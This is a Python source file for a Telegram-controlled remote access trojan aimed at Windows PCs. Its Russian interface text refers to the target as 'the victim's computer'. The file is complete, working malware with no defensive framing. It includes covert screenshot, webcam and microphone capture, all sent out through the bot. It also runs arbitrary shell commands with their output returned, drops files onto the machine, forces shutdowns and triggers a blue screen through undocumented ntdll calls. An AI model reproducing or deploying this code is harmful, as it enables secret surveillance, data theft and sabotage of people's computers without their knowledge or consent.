import os
import telebot
from PIL import ImageGrab
import tempfile
import ctypes
import cv2
import threading
import pyaudio
import wave
from moviepy.editor import *
from telebot.types import Message
import requests
import subprocess
import webbrowser
import chardet

API = 'TOKEN'

bot = telebot.TeleBot(API)


def create_inline_keyboard():
    keyboard = telebot.types.InlineKeyboardMarkup()
    keyboard.row_width = 2
    keyboard.add(
        telebot.types.InlineKeyboardButton('Скрин экрана ПК', callback_data='screenshot'),
        telebot.types.InlineKeyboardButton('Выключить ПК', callback_data='shutdown'),
        telebot.types.InlineKeyboardButton('Перезагрузить ПК', callback_data='restart'),
        telebot.types.InlineKeyboardButton('Вызвать BSOD', callback_data='bsod'),
        telebot.types.InlineKeyboardButton('Коннект к веб камере', callback_data='camera'),
        telebot.types.InlineKeyboardButton('Узнать IP компьютера', callback_data='get_ip'),
        telebot.types.InlineKeyboardButton('Вывести СМС на экран ПК', callback_data='messcren'),
        telebot.types.InlineKeyboardButton('Загуглить на ПК', callback_data='google_search'),
        telebot.types.InlineKeyboardButton('Перехват звука', callback_data='voice_record'),
        telebot.types.InlineKeyboardButton('Управление CMD', callback_data='cmd_open'),
        telebot.types.InlineKeyboardButton('Закачать файл на ПК', callback_data='upload_file')
    )
    return keyboard

user_data = {}
INPUT_DURATION = 0

def record_video(duration):
    cap = cv2.VideoCapture(0)
    video_frames = []
    
    frames_to_record = duration * 30
    frames_recorded = 0

    while frames_recorded < frames_to_record:
        ret, frame = cap.read()
        if ret:
            video_frames.append(frame)
            frames_recorded += 1
        
    cap.release()  

    out = cv2.VideoWriter("temp_video.avi", cv2.VideoWriter_fourcc(*"XVID"), 30, (640, 480))
    for frame in video_frames:
        out.write(frame)
    out.release()  

def record_audio(filename, duration=10):
    CHUNK = 1024
    FORMAT = pyaudio.paInt16
    CHANNELS = 1
    RATE = 44100

    audio = pyaudio.PyAudio()

    stream = audio.open(format=FORMAT,
                        channels=CHANNELS,
                        rate=RATE,
                        input=True,
                        frames_per_buffer=CHUNK)

    frames = []

    print("Запись началась...")
    for _ in range(int(RATE / CHUNK * duration)):
        data = stream.read(CHUNK)
        frames.append(data)

    print("Записи завершены.")
    stream.stop_stream()
    stream.close()
    audio.terminate()


    wf = wave.open(filename, "wb")
    wf.setnchannels(CHANNELS)
    wf.setsampwidth(audio.get_sample_size(FORMAT))
    wf.setframerate(RATE)
    wf.writeframes(b"".join(frames))
    wf.close()


@bot.message_handler(commands=['start'])
def send_welcome(message):
    bot.send_message(message.chat.id, 'Привет! Что вы хотите сделать?', reply_markup=create_inline_keyboard())

def send_screenshot(message):
    path = tempfile.gettempdir() + '/screenshot.png'
    screenshot = ImageGrab.grab()
    screenshot.save(path, 'PNG')
    bot.send_photo(message.chat.id, open(path, 'rb'))


def open_website(message: Message):
    url = message.text
    if url.startswith('http://') or url.startswith('https://'):
        webbrowser.open(url)
        bot.send_message(message.chat.id, f'Открыт браузер на компьютере жертвы со страницей: {url}')
    else:
        search_query = message.text
        url = f"https://www.google.com/search?q={search_query}"
        webbrowser.open(url)
        bot.send_message(message.chat.id, f'Открыт браузер на компьютере жертвы с запросом: {search_query}')


@bot.callback_query_handler(func=lambda call: True)
def handle_callback_query(call):
    if call.data == 'screenshot':
        bot.send_message(call.message.chat.id, 'Делаю скриншот экрана...')
        send_screenshot(call.message)
    elif call.data == 'shutdown':
        bot.send_message(call.message.chat.id, 'Выключаю...')
        os.system('shutdown -s -t 0')
    elif call.data == 'restart':
        bot.send_message(call.message.chat.id, 'Перезагружаю...')
        os.system('shutdown -r -t 0')
    elif call.data == 'bsod':
        bot.send_message(call.message.chat.id, 'Вызываю синий экран смерти...')
        ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
        ctypes.windll.ntdll.NtRaiseHardError(0xc0000022, 0, 0, 0, 6, ctypes.byref(ctypes.c_ulong()))
    elif call.data == 'get_ip':
        bot.send_message(call.message.chat.id, 'Узнаю IP компьютера...')
        get_computer_ip(call.message)
    elif call.data == 'voice_record':
        bot.send_message(call.message.chat.id, 'Введите, сколько времени записывать аудио (в секундах):')
        bot.register_next_step_handler(call.message, record_audio_duration)
    elif call.data == 'messcren':
        bot.send_message(call.message.chat.id, 'Введите сообщение для отображения на экране жертвы:')
        bot.register_next_step_handler(call.message, show_messagebox)
    elif call.data == 'google_search':
        bot.send_message(call.message.chat.id, 'Введите запрос для поиска в Google или веб сайт:')
        bot.register_next_step_handler(call.message, open_website)
    elif call.data == 'cmd_open':
        bot.send_message(call.message.chat.id, 'Введите команду для выполнения в командной строке:')
        bot.register_next_step_handler(call.message, execute_command)

    elif call.data == 'upload_file':
        bot.send_message(call.message.chat.id, 'Введите путь для сохранения файла на компьютере:')
        bot.register_next_step_handler(call.message, download_file)

    elif call.data == 'camera':
        bot.send_message(call.message.chat.id, 'Введите, сколько времени записывать видео и аудио (в секундах):')
        bot.register_next_step_handler(call.message, start_video_and_audio_recording)

def start_video_and_audio_recording(message: Message):
    try:
        duration = int(message.text)
        if duration < 1:
            bot.send_message(message.chat.id, 'Некорректное время. Введите положительное число больше 0.')
            return

        bot.send_message(message.chat.id, f'Подключаюсь к камере и записываю видео и аудио в течение {duration} секунд...')

        video_thread = threading.Thread(target=record_video, args=(duration,))
        audio_thread = threading.Thread(target=record_audio, args=("temp_audio.wav", duration))

        video_thread.start()
        audio_thread.start()

        video_thread.join()
        audio_thread.join()
        
        bot.send_message(message.chat.id, 'Записи завершены. Объединяю аудио и видео...')
        
  
        video_clip = VideoFileClip("temp_video.avi")
        audio_clip = AudioFileClip("temp_audio.wav")
        final_clip = video_clip.set_audio(audio_clip)
        final_clip.write_videofile("final_video.mp4", codec="libx264")

        bot.send_message(message.chat.id, 'Видео готово! Отправляю...')
        with open("final_video.mp4", "rb") as video_file:
            bot.send_video(message.chat.id, video_file)


        os.remove("temp_video.avi")
        os.remove("temp_audio.wav")
        os.remove("final_video.mp4")

    except ValueError:
        bot.send_message(message.chat.id, 'Некорректное время. Введите положительное число.')

def record_audio_duration(message: Message):
    try:
        duration = int(message.text)
        if duration < 1:
            bot.send_message(message.chat.id, 'Некорректное время. Введите положительное число больше 0.')
            return

        bot.send_message(message.chat.id, f'Записываю звук в течение {duration} секунд...')

        audio_thread = threading.Thread(target=record_audio, args=("temp_audio.wav", duration))
        audio_thread.start()
        audio_thread.join()

        bot.send_message(message.chat.id, 'Запись завершена. Отправляю...')

        bot.send_chat_action(message.chat.id, 'record_audio')
        with open("temp_audio.wav", "rb") as audio_file:
            bot.send_voice(message.chat.id, audio_file)

        os.remove("temp_audio.wav")

    except ValueError:
        bot.send_message(message.chat.id, 'Некорректное время. Введите положительное число.')

    

def get_computer_ip(message):
    try:
        response = requests.get('https://api.ipify.org?format=json')
        if response.status_code == 200:
            data = response.json()
            ip_address = data['ip']
            bot.send_message(message.chat.id, f'IP компьютера: {ip_address}')
        else:
            bot.send_message(message.chat.id, 'Не удалось получить IP компьютера.')
    except Exception as e:
        bot.send_message(message.chat.id, 'Произошла ошибка при получении IP компьютера.')

def show_messagebox(message: Message):
    cmd = f'msg * "{message.text}"'
    subprocess.run(cmd, shell=True)

    bot.send_message(message.chat.id, 'Сообщение было получено.')

def execute_command(message: Message):
    try:
        command = message.text

        standard_apps = {
            "notepad": "notepad.exe",
            "calc": "calc.exe",
            "cmd": "cmd.exe",
        }

        if command.lower() in standard_apps:
            app_name = command.lower()
            app_path = standard_apps[app_name]

            if os.name == "nt":
                try:
                    ctypes.windll.shell32.ShellExecuteW(None, "runas", app_path, None, None, 1)
                    bot.send_message(message.chat.id, f'{app_name.capitalize()} запущено с правами администратора!')
                except Exception as e:
                    bot.send_message(message.chat.id, f'Ошибка при запуске с правами администратора: {e}')
        else:
            result = subprocess.check_output(command, shell=True)
            encoding = chardet.detect(result)['encoding']
            result = result.decode(encoding, errors='replace')
            bot.send_message(message.chat.id, f'Результат выполнения команды:\n\n{result}')
    except subprocess.CalledProcessError as e:
        bot.send_message(message.chat.id, f'Ошибка выполнения команды: {e}')
    except Exception as e:
        bot.send_message(message.chat.id, f'Произошла ошибка: {e}')


def ask_file_path(message: Message):
    bot.send_message(message.chat.id, 'Введите путь для сохранения файла на компьютере:')
    bot.register_next_step_handler(message, download_file)

def download_file(message: Message):
    file_path = message.text.strip()

    if not os.path.exists(file_path):
        bot.send_message(message.chat.id, 'Указанный путь не существует. Пожалуйста, введите корректный путь:')
        bot.register_next_step_handler(message, download_file)
        return

    if not os.path.isdir(file_path):
        bot.send_message(message.chat.id, 'Указанный путь не является директорией. Пожалуйста, введите путь к существующей директории:')
        bot.register_next_step_handler(message, download_file)
        return

    bot.send_message(message.chat.id, 'Отправьте мне файл для загрузки на компьютер.')
    bot.register_next_step_handler(message, save_file, file_path)

def save_file(message: Message, file_path: str):
    if message.document:
        try:
            file_info = bot.get_file(message.document.file_id)
            downloaded_file = bot.download_file(file_info.file_path)

            file_name = os.path.basename(file_info.file_path)
            file_full_path = os.path.join(file_path, file_name)

            with open(file_full_path, 'wb') as file:
                file.write(downloaded_file)

            bot.send_message(message.chat.id, f'Файл успешно сохранен по пути: {file_full_path}')
        except Exception as e:
            bot.send_message(message.chat.id, f'Произошла ошибка при сохранении файла: {e}')
    else:
        bot.send_message(message.chat.id, 'Пожалуйста, отправьте материал из раздела "файл".')
        bot.register_next_step_handler(message, save_file, file_path)




bot.infinity_polling()
